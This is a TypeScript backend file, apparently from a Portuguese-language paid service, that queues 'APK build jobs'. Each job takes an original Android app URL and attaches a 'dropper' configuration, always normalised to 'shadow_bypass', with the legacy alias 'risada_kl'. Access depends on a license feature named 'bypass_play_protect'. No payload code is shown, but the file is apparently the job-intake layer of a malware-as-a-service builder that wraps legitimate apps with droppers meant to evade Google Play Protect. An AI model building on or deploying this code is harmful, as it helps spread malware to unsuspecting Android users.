import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

export const getMyBuildJobs = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    try {
      const { data, error } = await context.supabase
        .from("apk_build_jobs")
        .select("*")
        .eq("user_id", context.userId)
        .order("created_at", { ascending: false });
      if (error) {
        console.error("[getMyBuildJobs] Supabase error:", error);
        throw error;
      }
      return data ?? [];
    } catch (e) {
      console.error("[getMyBuildJobs] Unexpected error:", e);
      throw e;
    }
  });

// Canonical dropper identifier. Older records may still carry `risada_kl`;
// treat both as equivalent when reading, but always write `shadow_bypass`.
export const SHADOW_BYPASS_DROPPER = "shadow_bypass" as const;
export const LEGACY_DROPPER_ALIASES = ["risada_kl"] as const;

const dropperTypeSchema = z
  .string()
  .transform((v) => (LEGACY_DROPPER_ALIASES.includes(v as any) ? SHADOW_BYPASS_DROPPER : v))
  .default(SHADOW_BYPASS_DROPPER);

export const createBuildJob = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .validator((input: unknown) =>
    z.object({
      appName: z.string().trim().min(2, "Nome muito curto").max(50, "Nome muito longo")
        .regex(/^[\w\s\-.()\[\]]+$/u, "Use apenas letras, números, espaços e - . ( )"),
      originalApkUrl: z.string().url("URL do APK inválida"),
      originalIconUrl: z.string().url().optional(),
      dropperType: dropperTypeSchema,
      config: z.record(z.string(), z.any()).optional().default({}),
    }).parse(input)
  )
  .handler(async ({ data, context }) => {
    const { resolveRoles } = await import("@/lib/roles.server");
    const roles = await resolveRoles(context as any);

    if (!roles.isStaff) {
      // 1) Access check
      const { data: license, error: lErr } = await context.supabase
        .from("licenses")
        .select("plan_slug")
        .eq("user_id", context.userId)
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();

      if (lErr) {
        console.error("[createBuildJob] License fetch error:", lErr);
        throw new Error("Não foi possível verificar sua licença. Tente novamente.");
      }

      const { tierFromPlanSlug, getTierFeatures } = await import("@/lib/plans");
      const tier = tierFromPlanSlug(license?.plan_slug);
      const features = getTierFeatures(tier);

      if (!features.bypass_play_protect) {
        throw new Error("Seu plano não inclui acesso ao Shadow Bypass.");
      }

      // 2) Rate-limit: no more than 3 pending/processing jobs at a time
      const { count: activeCount, error: cErr } = await context.supabase
        .from("apk_build_jobs")
        .select("id", { count: "exact", head: true })
        .eq("user_id", context.userId)
        .in("status", ["pending", "processing"]);
      if (cErr) console.warn("[createBuildJob] active-count error:", cErr);
      if ((activeCount ?? 0) >= 3) {
        throw new Error("Você já tem 3 builds em processamento. Aguarde uma finalizar.");
      }
    }

    // Resilient insert
    async function insertJob(p: any) {
      const result = await context.supabase
        .from("apk_build_jobs")
        .insert(p)
        .select("id")
        .maybeSingle();
      if (result.error) console.error("[createBuildJob] Job insertion error:", result.error);
      return result;
    }

    const jobPayload = {
      user_id: context.userId,
      app_name: data.appName,
      original_apk_url: data.originalApkUrl,
      original_icon_url: data.originalIconUrl || null,
      status: "pending" as const,
      progress: 0,
    };

    let { data: job, error } = await insertJob(jobPayload);

    // Schema cache fallback (PGRST204)
    if (error && (error as any).code === "PGRST204") {
      console.warn("[createBuildJob] Schema mismatch, retrying minimal insert...");
      const { original_icon_url, ...fallback } = jobPayload;
      const retry = await insertJob(fallback);
      job = retry.data;
      error = retry.error;
    }

    if (error || !job) {
      throw error || new Error("Falha ao criar job de build. Verifique se a tabela 'apk_build_jobs' existe.");
    }

    const { error: cfgErr } = await context.supabase.from("apk_dropper_configs").insert({
      job_id: job.id,
      dropper_type: data.dropperType, // always normalized to shadow_bypass
      config_json: (data.config ?? {}) as any,
    });
    if (cfgErr) {
      // Roll back the parent job if the config write fails so the worker
      // never picks up a job with a missing dropper config.
      console.error("[createBuildJob] Dropper config insert failed, rolling back job:", cfgErr);
      await context.supabase.from("apk_build_jobs").delete().eq("id", job.id);
      throw new Error("Falha ao registrar configuração do Shadow Bypass. Tente novamente.");
    }

    return job;
  });